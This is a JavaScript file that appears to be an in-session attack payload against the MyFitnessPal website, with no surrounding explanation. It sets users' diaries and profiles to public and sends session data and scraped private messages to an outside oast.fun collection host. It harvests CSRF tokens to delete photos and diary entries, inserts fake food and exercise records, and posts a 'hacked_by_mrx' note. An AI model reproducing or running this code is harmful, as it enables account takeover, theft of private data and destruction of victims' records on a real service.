fetch('https://www.myfitnesspal.com/api/services/account/diary_settings', {
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0'
    },
    body: JSON.stringify({
      "tracked_nutrients": [
        { "nutrient_name_id": 1, "position": 1, "display_name": "Calories", "field_name": "calories" },
        { "nutrient_name_id": 10 },
        { "nutrient_name_id": 2 },
        { "nutrient_name_id": 13 },
        { "nutrient_name_id": 8 },
        { "nutrient_name_id": 12 }
      ],
      "meal_names": [
        { "description": "Breakfast" },
        { "description": "Lunch" },
        { "description": "Dinner" },
        { "description": "Snacks" },
        { "description": "" },
        { "description": "" }
      ],
      "preference": {
        "allow_negative_calorie_adjustment": false,
        "diary_privacy_setting": "public",
        "diary_password": "",
        "display_diary_meal_macros": true,
        "default_food_view": "recent"
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));



  fetch('https://www.myfitnesspal.com/api/services/users', {
    method: 'PATCH',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Captcha-Token': 'undefined',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/fr/account/profile-privacy',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
    },
    body: JSON.stringify({
      "item": {
        "privacy_preferences": {
          "age_visibility": "public",
          "profile_visibility": "public"
        }
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
  
  

  fetch('https://www.myfitnesspal.com/api/services/users', {
    method: 'PATCH',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Captcha-Token': 'undefined',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/fr/account/profile-privacy',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
    },
    body: JSON.stringify({
      "item": {
        "privacy_preferences": {
          "age_visibility": "public",
          "profile_visibility": "public"
        }
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

  fetch('https://www.myfitnesspal.com/api/auth/session', {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Referer': 'https://www.myfitnesspal.com/profile/testooogh1',
      'Content-Type': 'application/json',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'If-None-Match': 'W/"10btolj6iso7r"',
      'Priority': 'u=4'
    }
  })
  .then(response => response.json())
  .then(data => fetch("https://qlczvvvmiqyxqynbxerdjf7auvwuhz7ow.oast.fun/?userdata="+btoa(JSON.stringify(data, null, 2))))
  .catch(error => console.error('Error:', error));
  





let words=""

  fetch('https://www.myfitnesspal.com/_next/data/T-PTLMRchCwojvqdquoFQ/en/messages.json', {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Referer': 'https://www.myfitnesspal.com/messages',
      'X-Nextjs-Data': '1',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
      'Te': 'trailers'
    }
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      // Initialize an array to hold the collected elements
      const collectedElements = [];
  
      // Recursive function to find the specified elements
      function collectElements(obj) {
        if (typeof obj === 'object' && obj !== null) {
          if (Array.isArray(obj)) {
            // If obj is an array, iterate through each element
            obj.forEach(item => collectElements(item));
          } else {
            // Check if the object has the desired properties
            const { id, created_at, read_at, subject, body, from_user_id, from_username, to_user_id, to_username } = obj;
            if (id || created_at || read_at || subject || body || from_user_id || from_username || to_user_id || to_username) {
              collectedElements.push({ id, created_at, read_at, subject, body, from_user_id, from_username, to_user_id, to_username });
            }
            // Recur for all properties of the object
            for (const key in obj) {
              collectElements(obj[key]);
            }
          }
        }
      }
  
      // Start the recursive collection with the top-level data
      collectElements(data);
  
      // Log the collected elements
      collectedElements.forEach((e)=>{
        if(e.body){
        const jsonString = JSON.stringify(e, null, 2);
        words+=jsonString+"\n"
        }else{
          console.log("none")
        }
      })
      //console.log(collectedElements[0]);
      fetch("https://qlczvvvmiqyxqynbxerdjf7auvwuhz7ow.oast.fun/user_messages="+btoa(words))
    })
    .catch(error => console.error('Error:', error));
  




    ///// block user :



    fetch('https://www.myfitnesspal.com/api/services/blocked_users/block', {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/json',
          'Origin': 'https://www.myfitnesspal.com',
          'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'Priority': 'u=0'
        },
        body: JSON.stringify({
            "username":"MyFitnessPal"
        })
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));


    
    ////// deblock user :


    fetch('https://www.myfitnesspal.com/api/services/blocked_users/bulk_unblock', {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/json',
          'Origin': 'https://www.myfitnesspal.com',
          'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'Priority': 'u=0'
        },
        body: JSON.stringify({
           "usernames":["poc4mrxxaaa"]
        })
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));



//// delete pfp :

fetch('https://www.myfitnesspal.com/photos/edit')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Network response was not ok');
    }
  })
  .then(html => {
    processHTML(html);  // Call the function to process the HTML and extract CSRF token
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });

function processHTML(htmlString) {
  // Create a DOM parser
  let parser = new DOMParser();
  let doc = parser.parseFromString(htmlString, 'text/html');

  // Extract the CSRF token from the meta tag
  let csrfMeta = doc.querySelector('meta[name="csrf-token"]');
  let csrfToken = '';
  if (csrfMeta) {
    csrfToken = csrfMeta.getAttribute('content'); // Get the value of the 'content' attribute
    console.log(`CSRF Token: ${csrfToken}`); // Logs the CSRF token
  }

  // Get all <a> tags that contain "delete" in href
  let aTags = doc.querySelectorAll('a');
  aTags.forEach(a => {
    if (a.href.includes('delete')) {
      let deleteId = a.href.match(/\/delete\/(\d+)/); // Regex to capture the number after "/delete/"
      if (deleteId) {
        let deleteUrl = `https://www.myfitnesspal.com/photos/delete/${deleteId[1]}`; // Build the delete URL
        console.log(`Delete URL: ${deleteUrl}`);

        // Perform the DELETE request with the CSRF token
        fetch(deleteUrl, {
          method: 'DELETE',
          headers: {
            'X-Csrf-Token': csrfToken,  // Include the CSRF token in the header
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': '*/*',
            'Referer': 'https://www.myfitnesspal.com/photos/edit'
          }
        })
        .then(response => {
          if (response.ok) {
            console.log(`Successfully deleted ID: ${deleteId[1]}`);
          } else {
            console.error(`Failed to delete ID: ${deleteId[1]}`);
          }
        })
        .catch(error => {
          console.error('Error during delete request:', error);
        });
      }
    }
  });
}


/// delete diary :

fetch('https://www.myfitnesspal.com/food/diary')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Network response was not ok');
    }
  })
  .then(html => {
    extractDeleteIds(html);  // Call the function to process the HTML and extract IDs
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });

function extractDeleteIds(htmlString) {
  // Create a DOM parser
  let parser = new DOMParser();
  let doc = parser.parseFromString(htmlString, 'text/html');

  // Get all <a> tags that contain data-method="delete"
  let deleteLinks = doc.querySelectorAll('a[data-method="delete"]');

  // Iterate over the links and extract the IDs from the href attribute
  deleteLinks.forEach(link => {
    let href = link.getAttribute('href');
    let idMatch = href.match(/\/food\/remove\/(\d+)/);  // Regex to extract the ID after "/food/remove/"
    if (idMatch) {
      delete_diary(idMatch[1])
      console.log(`ID: ${idMatch[1]}`);  // Logs the extracted ID
    }
  });
}


function delete_diary(id){

    fetch('https://www.myfitnesspal.com/photos/edit')
    .then(response => {
      if (response.ok) {
        return response.text();
      } else {
        throw new Error('Network response was not ok');
      }
    })
    .then(html => {
      processHTML(html);  // Call the function to process the HTML and extract CSRF token
    })
    .catch(error => {
      console.error('There was a problem with the fetch operation:', error);
    });
  
  function processHTML(htmlString) {
    // Create a DOM parser
    let parser = new DOMParser();
    let doc = parser.parseFromString(htmlString, 'text/html');
  
    // Extract the CSRF token from the meta tag
    let csrfMeta = doc.querySelector('meta[name="csrf-token"]');
    let csrfToken = '';
    if (csrfMeta) {
      csrfToken = csrfMeta.getAttribute('content'); // Get the value of the 'content' attribute
      pure_delete(csrfToken)
      console.log(`CSRF Token: ${csrfToken}`); // Logs the CSRF token
    }
    
  }


    function pure_delete(csrf){ 
    fetch('https://www.myfitnesspal.com/food/remove/'+id, {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.myfitnesspal.com',
          'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'Priority': 'u=0'
        },
        body: "_method=delete&authenticity_token="+csrf
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
}
}


/// Add diary food :
add_diary()
function add_diary(){

fetch('https://www.myfitnesspal.com/user/auth_token?refresh=true', {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Referer': 'https://www.myfitnesspal.com/profile/testooogh1',
      'Content-Type': 'application/json',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'If-None-Match': 'W/"10btolj6iso7r"',
      'Priority': 'u=4'
    }
  })
  .then(response => response.json())
  .then(data => access=data["access_token"])
  .catch(error => console.error('Error:', error));




  fetch('https://www.myfitnesspal.com/photos/edit')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Network response was not ok');
    }
  })
  .then(html => {
    processHTML(html);  // Call the function to process the HTML and extract CSRF token
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });

function processHTML(htmlString) {
  // Create a DOM parser
  let parser = new DOMParser();
  let doc = parser.parseFromString(htmlString, 'text/html');

  // Extract the CSRF token from the meta tag
  let csrfMeta = doc.querySelector('meta[name="csrf-token"]');
  let csrfToken = '';
  if (csrfMeta) {
    csrfToken = csrfMeta.getAttribute('content'); // Get the value of the 'content' attribute
    for_all(csrfToken)
    console.log(`CSRF Token: ${csrfToken}`); // Logs the CSRF token
  }
  
}

function for_all(token){

for(i=0;i<=5;i++){
fetch('https://www.myfitnesspal.com/food/add', {
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
      'Authorization': 'Bearer '+access,
      'X-Csrf-Token': token,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0'
    },
    body: "food_entry%5Bfood_id%5D=2689909138&food_entry%5Bdate%5D=2024-10-18&food_entry%5Bquantity%5D=1.0&food_entry%5Bweight_id%5D=3099756008&food_entry%5Bmeal_id%5D="+i+"&ajax=true"
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
}
}

}






/// Add note :

fetch('https://www.myfitnesspal.com/photos/edit')
.then(response => {
  if (response.ok) {
    return response.text();
  } else {
    throw new Error('Network response was not ok');
  }
})
.then(html => {
  processHTML(html);  // Call the function to process the HTML and extract CSRF token
})
.catch(error => {
  console.error('There was a problem with the fetch operation:', error);
});

function processHTML(htmlString) {
// Create a DOM parser
let parser = new DOMParser();
let doc = parser.parseFromString(htmlString, 'text/html');

// Extract the CSRF token from the meta tag
let csrfMeta = doc.querySelector('meta[name="csrf-token"]');
let csrfToken = '';
if (csrfMeta) {
  csrfToken = csrfMeta.getAttribute('content'); // Get the value of the 'content' attribute
  add_note(csrfToken)
  console.log(`CSRF Token: ${csrfToken}`); // Logs the CSRF token
}

}

function add_note(csrf_to){
    fetch('https://www.myfitnesspal.com/exercise/save_note', {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.myfitnesspal.com',
          'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'Priority': 'u=0'
        },
        body: "authenticity_token="+csrf_to+"&note%5Bbody%5D=hacked_by_mrx"
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
}





/// add exercice :


fetch('https://www.myfitnesspal.com/photos/edit')
.then(response => {
  if (response.ok) {
    return response.text();
  } else {
    throw new Error('Network response was not ok');
  }
})
.then(html => {
  processHTML(html);  // Call the function to process the HTML and extract CSRF token
})
.catch(error => {
  console.error('There was a problem with the fetch operation:', error);
});

function processHTML(htmlString) {
// Create a DOM parser
let parser = new DOMParser();
let doc = parser.parseFromString(htmlString, 'text/html');

// Extract the CSRF token from the meta tag
let csrfMeta = doc.querySelector('meta[name="csrf-token"]');
let csrfToken = '';
if (csrfMeta) {
  csrfToken = csrfMeta.getAttribute('content'); // Get the value of the 'content' attribute
  add_ex(csrfToken)
  console.log(`CSRF Token: ${csrfToken}`); // Logs the CSRF token
}

}

function add_ex(csrf_to2){
    fetch('https://www.myfitnesspal.com/exercise/add', {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.myfitnesspal.com',
          'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'Priority': 'u=0'
        },
        body: "authenticity_token="+csrf_to2+"&calorie_multiplier=1.0&search=jump&exercise_entry%5Bexercise_id%5D=421094&exercise_entry%5Bdate%5D=2024-10-18&exercise_entry%5Bexercise_type%5D=0&authenticity_token="+csrf_to2+"&exercise_entry%5Bquantity%5D=10&exercise_entry%5Bcalories%5D=63"
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error:', error));
}
